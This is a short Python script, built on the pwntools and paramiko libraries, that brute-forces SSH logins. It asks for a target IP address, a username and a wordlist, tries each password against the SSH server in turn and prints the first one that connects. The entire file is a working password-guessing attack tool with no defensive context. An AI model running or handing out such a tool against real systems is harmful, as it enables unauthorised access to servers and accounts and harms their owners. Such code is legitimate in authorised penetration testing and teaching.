from pwn import *
import paramiko


ip= input("enter the ip: ")
user= input("enter the username: ")
path=input("enter the path of wordlist: ")
attempts= 0

with open(path, "r") as password:
	for p in password:
           passw= p.strip("\n")
           try:
             print("[{}] attempting password: {}!". format(attempts, passw))
             connect= ssh(host=ip, user=user, password=passw, timeout=5)
             if connect.connected:
                print(" [>] password found: '{}'". format(passw))
                connect.close()
                break
             else:
                connect.close()
           except paramiko.ssh_exception.AuthenticationException:
                print("[x] invalid password!")
                attempts +=1
